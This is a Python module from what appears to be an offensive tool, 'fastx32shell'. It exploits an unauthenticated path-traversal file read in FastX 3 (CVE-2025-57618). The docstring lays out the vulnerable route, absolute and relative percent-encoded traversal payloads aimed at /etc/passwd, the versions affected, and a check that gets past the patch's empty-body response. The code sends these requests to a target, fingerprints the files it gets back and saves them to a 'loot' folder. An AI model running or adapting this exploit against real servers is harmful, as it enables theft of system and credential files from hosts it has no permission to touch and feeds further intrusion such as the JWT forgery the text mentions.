"""FastX 3 unauthenticated arbitrary file read (CVE-2025-57618 family).

Affected FastX 3 builds register an error-asset route whose handler passes the
route parameter straight into a path join:

    router.get('/error/assets/:myfile', (req, res, next) => {
        let p = path.resolve(__dirname, 'assets', req.params.myfile);
        if (!fs.existsSync(p)) { return res.send(''); }
        res.sendFile(p);
    })

No validation is applied, so any path the process can read is returned to an
unauthenticated client. `path.resolve` discards the prefix entirely when the
parameter is an absolute path, which is why two request forms exist:

    absolute   /error/assets/%2fetc%2fpasswd
               Leading slash percent-encoded. No dot segments, so a reverse
               proxy that normalises or rejects "../" will not interfere.
               Preferred when it works.

    relative   /error/assets/..%2f..%2f..%2fetc%2fpasswd
               The form used by public tooling. Depth depends on the install
               layout, and some proxies answer 400 before the request reaches
               the application.

Both are attempted with --form auto (the default): absolute first, then
relative at increasing depth, stopping at the first form that returns a body.

Read-only: one GET per path, no writes, no authentication, no session API.

Version scope
-------------
    3.0.32 .. 3.3.69    VULNERABLE - no validation on req.params.myfile
    3.3.71              fixed - hardcoded filename allowlist

StarNet's release notes list the fix as 3.3.71, "Case 94492: Security fix",
9 October 2025.

This is CVE-2025-57618, published 2025-10-14, which covers the file read and
the JWT forgery it enables as one chain. NVD's affected range, "thru 3.3.67",
understates it: 3.3.69 has no allowlist.

The fix is an allowlist, and it rejects by returning res.send(''): HTTP 200 with
an empty body, which is byte-identical to the handler's "not found" response.
A patched server and an absent route cannot be told apart by status code, which
is why looks_like_body() requires a non-empty body. Without that check this tool
would report a patched 3.3.71 as vulnerable.

Examples
--------
    fastx32shell read --base https://fastx.example.com --check
    fastx32shell read --base https://fastx.example.com --file /etc/passwd
    fastx32shell read --base https://fastx.example.com --file /etc/passwd \
                    --file /etc/hostname --outdir ./loot
    fastx32shell read --base https://fastx.example.com:3300 --file /etc/passwd \
                    --form relative --depth 11

Exit codes
    0   at least one path was read
    1   no path was read (route absent, patched, or blocked by a front end)
    64  usage error
"""

import hashlib
import os
import urllib.parse

from fastx32shell import http

ROUTE = "/error/assets/"
DEFAULT_DEPTHS = (9, 10, 11, 12)


def encode_path(path):
    """Percent-encode a filesystem path for use inside the route parameter."""
    return urllib.parse.quote(path, safe="/").replace("/", "%2f")


def route_params(path, forms, depth):
    """Yield (label, route_parameter) pairs to try for one filesystem path."""
    stripped = path.lstrip("/")
    if "absolute" in forms:
        yield "absolute", "%2f" + encode_path(stripped)
    if "relative" in forms:
        if depth is not None:
            depths = (depth,)
        else:
            depths = DEFAULT_DEPTHS
        for d in depths:
            yield "relative/%d" % d, "%2e%2e%2f" * d + encode_path(stripped)


def looks_like_body(status, body):
    """A 200 with no body is the handler's 'not found' path, not a read."""
    return status == 200 and len(body) > 0


def add_arguments(parser):
    parser.add_argument("--base", required=True,
                        help="target base URL, e.g. https://fastx.example.com[:port]")
    parser.add_argument("--file", action="append", default=[],
                        help="remote path to read; repeatable")
    parser.add_argument("--check", action="store_true",
                        help="probe /etc/passwd only, report which form works, then exit")
    parser.add_argument("--form", choices=("auto", "absolute", "relative"),
                        default="auto", help="request form to use (default: auto)")
    parser.add_argument("--depth", type=int, default=None,
                        help="fixed relative-traversal depth; default tries %s"
                             % (", ".join(map(str, DEFAULT_DEPTHS))))
    parser.add_argument("--outdir", default=None,
                        help="write each response body here")
    parser.set_defaults(_parser=parser)


def run(args):
    if args.check and not args.file:
        args.file = ["/etc/passwd"]
    if not args.file:
        args._parser.error("pass --file or --check")

    base = args.base.rstrip("/")

    opener = http.make_opener(insecure=args.insecure, proxy=args.proxy,
                              ca=args.ca)

    if args.form == "auto":
        forms = ("absolute", "relative")
    else:
        forms = (args.form,)

    if args.outdir:
        os.makedirs(args.outdir, exist_ok=True)

    failed = 0
    for path in args.file:
        hit = None
        for label, param in route_params(path, forms, args.depth):
            url = base + ROUTE + param
            status, body, headers = http.get(opener, url, args.timeout,
                                              ua=args.ua or http.DEFAULT_UA)
            if looks_like_body(status, body):
                hit = (label, status, body, headers, url)
                break

        if hit is None:
            failed += 1
            print("%-40s NO READ" % path)
            if args.check:
                print("  no form returned a body; the route is absent, "
                      "patched, or blocked by a front end")
            continue

        label, status, body, headers, url = hit
        digest = hashlib.sha256(body).hexdigest()
        print("%-40s %s  http=%s  %d bytes  sha256=%s"
              % (path, label, status, len(body), digest[:16]))

        if args.check:
            ctype = headers.get("Content-Type", "unknown")
            print("  form    %s" % label)
            print("  url     %s" % url)
            print("  type    %s" % ctype)
            fingerprint = b"root:" in body and b"/bin/" in body
            print("  content %s" % ("looks like /etc/passwd"
                                    if fingerprint else "non-empty, inspect before trusting"))
            print("  verdict the route reads arbitrary files without authentication")

        preview = body[:120].decode("utf-8", "replace").replace("\n", "|")
        print("  %s" % preview)

        if args.outdir:
            safe = path.strip("/").replace("/", "_") or "root"
            dest = os.path.join(args.outdir, safe)
            with open(dest, "wb") as fh:
                fh.write(body)
            print("  saved   %s" % dest)

    return 1 if failed == len(args.file) else 0

